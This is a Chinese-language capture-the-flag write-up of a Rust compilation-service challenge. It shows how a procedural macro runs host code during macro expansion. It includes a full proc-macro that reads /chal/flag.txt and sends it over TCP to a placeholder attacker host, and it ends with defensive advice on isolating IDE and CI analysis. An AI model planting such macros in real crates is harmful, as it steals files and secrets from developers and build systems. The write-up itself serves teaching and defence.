# Rust Compilation Service 2

## 题目简述

第二版不再返回二进制，只执行 cargo rustc -- -Zunpretty=expanded，模拟 VS Code rust-analyzer 为审查项目而做的宏展开，并丢弃 stdout。flag 仍位于 /chal/flag.txt。过程宏在编译/展开阶段本身就是宿主机代码，可以读取文件并通过网络外传。

## 解题过程

项目包含主 crate 与本地依赖 bad。bad/Cargo.toml 声明：

~~~toml
[lib]
proc-macro = true
~~~

过程宏入口在展开时读取 flag，并连接攻击者控制的 TCP 监听端：

~~~rust
extern crate proc_macro;

use proc_macro::TokenStream;
use std::fs;
use std::io::Write;
use std::net::TcpStream;

#[proc_macro]
pub fn make_answer(_item: TokenStream) -> TokenStream {
    let flag = fs::read("/chal/flag.txt").unwrap();
    let mut stream = TcpStream::connect("ATTACKER_HOST:PORT").unwrap();
    stream.write_all(&flag).unwrap();
    "fn answer() -> u32 { 42 }".parse().unwrap()
}
~~~

主 crate 通过 path dependency 引入 bad，并在源码顶层调用：

~~~rust
bad::make_answer!();

fn main() {}
~~~

将两个 crate 一起打包上传，服务调用宏展开时便执行恶意宏。虽然服务把编译输出重定向到 /dev/null，网络连接不受限制，监听端仍收到：

~~~text
maple{rUSt_m4Cr0s_4r3_R34LLY_R34LLY_R34LLY_p0W3RfUl}
~~~

官方示例使用比赛期 ngrok TCP 地址；复现时应替换为自己控制且明确授权的监听端。

## 方法总结

“只查看源码”在现代 IDE 和供应链中未必是被动操作：语言服务器可能解析依赖、运行构建脚本或展开过程宏。防护应把 IDE 分析和 CI 构建同样视为执行不可信代码，隔离文件、凭据和网络，并固定依赖来源。简单丢弃 stdout 不能阻止 DNS、TCP、HTTP 或构建产物侧信道。
